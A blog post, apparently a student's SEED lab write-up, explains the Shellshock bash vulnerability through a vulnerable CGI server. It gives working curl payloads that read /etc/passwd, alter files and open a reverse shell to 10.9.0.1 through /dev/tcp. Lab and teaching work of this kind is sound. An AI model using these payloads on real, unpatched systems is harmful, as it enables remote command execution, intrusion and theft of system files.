---
layout: post
title: Shellshock
excerpt: Shellshock, discovered in 2014, is a vulnerability in the bash shell that allows an attacker to execute arbitrary commands. The root cause of this vulnerability stems from a flaw in how bash processes environment variables. When it parses shell functions that are passed as environment variables, it automatically executes any additional code that is located after the function definition. This means that an attacker can craft an environment variable that includes malicious code, which is then executed by bash.
categories: [bash, cgi]
---

![shellshock]({{ site.baseurl }}/images/featured-images/shellshock.jpg)

Shellshock, discovered in 2014, is a vulnerability in the bash shell that allows an attacker to execute arbitrary commands. The root cause of this vulnerability stems from a flaw in how bash processes environment variables. When it parses shell functions that are passed as environment variables, it automatically executes any additional code that is located after the function definition. This means that an attacker can craft an environment variable that includes malicious code, which is then executed by bash.

Because shellshock can allow remote attackers to gain unauthorized access, execute arbitrary commands, and even take control of the affected machines, shellshock is quite a severe vulnerability.

In this post, I aim to document my findings and observations while performing a SEED lab.

<br>

### Passing Data to Bash via Environment Variable

This task explores how attackers can pass their data to a vulnerable bash program. In this task, there is a CGI program (getenv.cgi) on the server that can help identify what user data can get into the environment variables of a CGI program.

By using the web browser and navigating to `www.seedlab-shellshock.com/cgi-bi/getenv.cgi` we can see the environmental variables used by the CGI program. Some of these environment variables are set by the browser. If we compare the HTTP request headers with the environment variables printed out by the server, we can see some of these environment variables that are set by the browser.

![task-1-a](https://github.com/iukadike/blog/assets/58455326/c43e2417-6035-4a66-ba08-ee8c35214a3d)

These environment variables include:

- HTTP_HOST

- HTTP_USER_AGENT

- HTTP_ACCEPT

- HTTP_ACCEPT_LANGUAGE

- HTTP_ACCEPT_ENCODING

- HTTP_CONNECTION

- HTTP_UPGRADE_INSECURE_REQUESTS

- HTTP_CACHE_CONTROL

These HTTP request headers are set automatically by the web browser. If we want to set the environment variable data to arbitrary values, we will have to manually set the HTTP request headers sent. We can easily do this using `curl`.

Curl allows users to control most fields in an HTTP request. Some of the options that can be used to manually set the HTTP request headers are:

- `-A` or `--user-agent`: this is used to set a custom user-agent string

- `-e` or `--referer`: this is used to set a custom referer url

- `-H` or `--header`: this is used to set a custom HTTP header value in the form of `KEY:VALUE`

___

Below, we would test the above curl options to decipher which can be used to set the environment variables used by the cgi program.

`curl -A "test data" www.seedlab-shellshock.com/cgi-bin/getenv.cgi`

![task-1-b](https://github.com/iukadike/blog/assets/58455326/8652c26f-048e-40d1-8954-90fd66b9bd65)

We can see from the screenshot above that the custom user-agent string that we supplied to curl was used to set the "HTTP_USER_AGENT" environment variable used by the CGI program.

___

`curl --referer "test data" www.seedlab-shellshock.com/cgi-bin/getenv.cgi`

![task-1-c](https://github.com/iukadike/blog/assets/58455326/19211275-f913-49e9-8e6e-4ffebc5f28ad)

We can see from the screenshot above that the custom user-agent string that we supplied to curl was used to set the "HTTP_REFERER" environment variable used by the CGI program.

___

`curl --header "TEST: DATA" www.seedlab-shellshock.com/cgi-bin/getenv.cgi`

![task-1-d](https://github.com/iukadike/blog/assets/58455326/9c6f277f-9ef3-49d3-bb53-91e86ede6703)

We can see from the screenshot above that the custom user-agent string that we supplied to curl was used to set the "HTTP_TEST" environment variable used by the CGI program.

<br>

### Launching the Shellshock Attack

The shellshock attack does not depend on what is in the CGI program but rather on whether the bash program is vulnerable or not.

This task involves launching an attack through `http://www.seedlab-shellshock.com/cgi-bin/vul.cgi` to get the server to run an arbitrary command. In this task, the shell function `() { dummy;}` will be passed as a user-supplied string through curl. In addition to this shell function, we will add the attack code after the shell function.


#### Getting the server to send back the content of the /etc/passwd file

In order to receive the contents of the `/etc/passwd` file, we can craft the following command to `http://www.seedlab-shellshock.com/cgi-bin/vul.cgi`

`curl --user-agent "() { dummy;}; echo; /bin/cat /etc/passwd" www.seedlab-shellshock.com/cgi-bin/vul.cgi`

![task-2-a](https://github.com/iukadike/blog/assets/58455326/6f5a7755-17bb-44af-b9fe-0d5580d81dd0)

From the screenshot above, we can see that indeed the vulnerable bash program ran the command and we get back the contents of `/etc/passwd`

___

#### Getting the server to return its process user ID

In order to receive the process user ID of the server, we can craft the following command: `http://www.seedlab-shellshock.com/cgi-bin/vul.cgi`

`curl --referer "() { dummy;}; echo; /bin/id" www.seedlab-shellshock.com/cgi-bin/vul.cgi`

![task-2-b-1](https://github.com/iukadike/blog/assets/58455326/054a5d99-7a16-4886-b00a-0f7fcb9c26fb)

From the screenshot above, we can see that indeed the vulnerable bash program ran the command, and we get back the process user ID of the server.

From the result obtained, we do not have super user access, thus if we try to steal a privileged file like `/etc/shadow`, the attack will fail as seen from the scrrenshot below

![task-2-b-2](https://github.com/iukadike/blog/assets/58455326/5ac414b3-c6b5-4e08-b518-c732b3f75acf)

___

#### Getting the server to create a file inside `/tmp`

In order to tell the server to create a new file in `/tmp`, we can craft the following command: `http://www.seedlab-shellshock.com/cgi-bin/vul.cgi`

`curl --header "a: () { dummy;}; echo; /bin/touch /tmp/ukadike-2023" www.seedlab-shellshock.com/cgi-bin/vul.cgi`

![task-2-c](https://github.com/iukadike/blog/assets/58455326/b9de3b74-1719-4652-9bc7-5ce3a9d9b1d4)

From the screenshot above, we can see that indeed the vulnerable bash program ran the command and the server created the new file in `/tmp`

___

#### Getting the server to delete the previously created file inside `/tmp`

In order to tell the server to delete the file that was created in `/tmp`, we can craft the following command: `http://www.seedlab-shellshock.com/cgi-bin/vul.cgi`

`curl --header "a: () { dummy;}; echo; /bin/rm -f /tmp/ukadike-2023" www.seedlab-shellshock.com/cgi-bin/vul.cgi`

![task-2-d](https://github.com/iukadike/blog/assets/58455326/0268ce4e-3c35-4627-93e3-935e439f0a98)

From the screenshot above, we can see that indeed, the vulnerable bash program ran the command, and the server deleted the new file.

___

#### Experimenting with HTTP GET requests

HTTP GET requests attach data to the URL after the "?" symbol. Attaching some data to `http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi` via HTTP GET request shows that the environment variable `QUERY_STRING` is set by the server.

***`http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?HAHAH`***
![task-2-e](https://github.com/iukadike/blog/assets/58455326/bcea0b28-797e-47ab-a7e4-d12f3577e075)

To verify if we can indeed use this method to carry out an attack, we can craft the following command: `http://www.seedlab-shellshock.com/cgi-bin/vul.cgi`

`curl --get --data "() { dummy;}; echo; /bin/ls" www.seedlab-shellshock.com/cgi-bin/vul.cgi -v`

![task-2-f](https://github.com/iukadike/blog/assets/58455326/349bdfcb-7500-4e97-bb7b-b74db1251047)

From the screenshot above, we can see that the server responded with an error. The server does not expect to find a whitespace in the GET request data. Because of the presence of these whitespaces, the server throws an HTTP 400 Error (Bad Request).

Does that mean if we encode the whitespace, the attack will then be successful? To verify this, we can craft the following command: `http://www.seedlab-shellshock.com/cgi-bin/vul.cgi`

`curl --get --data "()%20{%20dummy;};%20echo;%20/bin/ls" www.seedlab-shellshock.com/cgi-bin/vul.cgi -v`

![task-2-g](https://github.com/iukadike/blog/assets/58455326/2c583bdf-e4da-419e-9a0e-c3b634d23805)

From the screenshot above, we can see that the server this time did not respond with an error. However, the attack was still unsuccessful. If we make the same request to `http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi` to see how the server saves the environment variable, we discover that the server stores the data with the encoding. This simply means that code is never interpreted as a shell function but rather as a shell variable, thus the attack fails.

![task-2-h](https://github.com/iukadike/blog/assets/58455326/eeda0833-795e-48d3-ac66-4c4cdb1ac8e8)

<br>

### Creating a Reverse Shell

A reverse shell is used to establish a command shell on a system by connecting to it from an external network. Rather than having to send multiple commands for various queries, one can send a command to create a shell and use that shell to execute other commands.

This task involves creating a reverse shell for the vulnerable server. To accomplish this,

- create a Netcat listener.

  `netcat -lvnkp 9999`

- craft the following command: `http://www.seedlab-shellshock.com/cgi-bin/vul.cgi`

  `curl --user-agent "() { dummy;}; echo; /bin/bash -i > /dev/tcp/10.9.0.1/9999 0<&1 2>&1" www.seedlab-shellshock.com/cgi-bin/getenv.cgi`

![task-3-a](https://github.com/iukadike/blog/assets/58455326/d299e494-9445-4b04-bd74-c3bb222a728d)

![task-3-b](https://github.com/iukadike/blog/assets/58455326/fc6a3e50-3554-4650-9e6d-668e3ca12962)

<details>
<summary><code>/bin/bash -i > /dev/tcp/10.9.0.1/9999 0<&1 2>&1</code></summary>

- `/bin/bash`: Specifies the execution of the bash shell.
- `-i`: Launches the Bash shell in interactive mode, allowing for user input and output.
- `> /dev/tcp/10.9.0.1/9999`: Redirects the output of the Bash shell to the TCP connection established with the IP address 10.9.0.1 on port 9999.
- `0<&1`: Redirects file descriptor 0 (standard input) to file descriptor 1 (standard output). This enables input from the TCP connection on port 9090, ensuring that user input can be received via the established shell.
- `2>&1`: Redirects file descriptor 2 (standard error) to file descriptor 1 (standard output). This ensures that error messages from the Bash shell are also captured and sent through the established TCP connection.

</details>

<br>

In summary, Shellshock is a security vulnerability found in the Unix/Linux Bash shell that allows attackers to execute arbitrary commands on a targeted system. It was discovered in 2014 and affected millions of systems. The vulnerability arises from a flaw in the way Bash handles environment variables. To prevent Shellshock, it is crucial to keep your system and software updated with the latest security patches.

Thanks for reading.
